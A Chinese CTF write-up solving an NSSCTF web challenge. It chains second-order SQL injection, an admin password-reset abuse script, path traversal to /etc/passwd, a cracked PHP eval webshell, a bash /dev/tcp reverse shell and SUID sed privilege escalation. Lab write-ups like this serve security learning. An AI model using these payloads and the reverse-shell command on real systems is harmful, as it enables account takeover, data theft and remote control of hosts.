打开开发者模式有一堆js文件，然后页面有个登录和注册的按钮，先尝试二次注入，先注册用户 admin"# 

登录后发现

```
Name admin
```

修改密码，成功登录admin

登录后，看源代码页面

```
<button onclick="updatePass()" type="button" class="disabled btn btn-sm btn-outline-secondary" data-target="#demo">保存</button>

发现不一样，虽然无法输入，但是改变密码使用的是updatePass()
```

```
function userUpdateInfo(){
			url: '/?c=user&m=updateUserInfo',
}
function updatePass(){
     //     url: '/?c=admin&m=updatePass',
}
```

我们先尝试，二次注入改变root密码，发现没有权限，所以使用我们admin的updatePass()来改变root密码

```
POST /?c=admin&m=updatePass HTTP/1.1
Host: node4.anna.nssctf.cn:28942
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 111
Origin: http://node4.anna.nssctf.cn:28942
Connection: close
Referer: http://node4.anna.nssctf.cn:28942/?c=user
Cookie: PHPSESSID=060fce0179d38738148d570a90676742

name=cm9vdA%3D%3D&newPass=202cb962ac59075b964b07152d234b70&oldPass=202cb962ac59075b964b07152d234b70&saying=MTIz

先从root"#改密码抓个包，然后登录admin,增加?c=admin&m=updatePass即可
```

还是用脚本方便点

```
import requests

url = 'http://node4.anna.nssctf.cn:28922/'
url1 = url + '?c=app&m=login'
url2 = url + '?c=admin&m=updatePass'

sess = requests.Session()

data = {
    "name": 'YWRtaW4=',#admin
    "pass": '202cb962ac59075b964b07152d234b70'#123
}
r = sess.post(url1, data=data)
print(r.text)

data = {
    "name": 'cm9vdA==',       # root
    "newPass": '202cb962ac59075b964b07152d234b70',    # 123
    "oldPass": '202cb962ac59075b964b07152d234b70',    # 123
    "saying": 'cm9vdA=='
}
r = sess.post(url2, data=data)
print(r.text)
```

有个仪表盘可以下载东西

```
GET /?c=root&m=downloadRequestLog&filename=../../../../../etc/passwd HTTP/1.1
Host: node4.anna.nssctf.cn:28379
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://node4.anna.nssctf.cn:28379/?c=root&m=getLogList
Cookie: PHPSESSID=060fce0179d38738148d570a90676742
Upgrade-Insecure-Requests: 1
```

存在目录穿越，查看敏感文件（当然也可以扫出来）知有一个强md5值碰撞

```
<?php 
if(md5(@$_GET['pass_31d5df001717'])==='3fde6bb0541387e4ebdadf7c2ff31123'){@eval($_GET['cc']);} 
// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.
?>
```

md5在线解密得到1q2w3e，得payload

```
http://node4.anna.nssctf.cn:28579/phpinfo.php?pass_31d5df001717=1q2w3e&cc=phpinfo();
```

连接蚁剑，打开终端输入`bash -c 'exec bash -i &>/dev/tcp/192.168.1.9/8888 <&1'`即可成功反弹shell



suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

找到sed，可以用来处理文件，用命令`sed -n '1,$p' /flag`查看flag即可

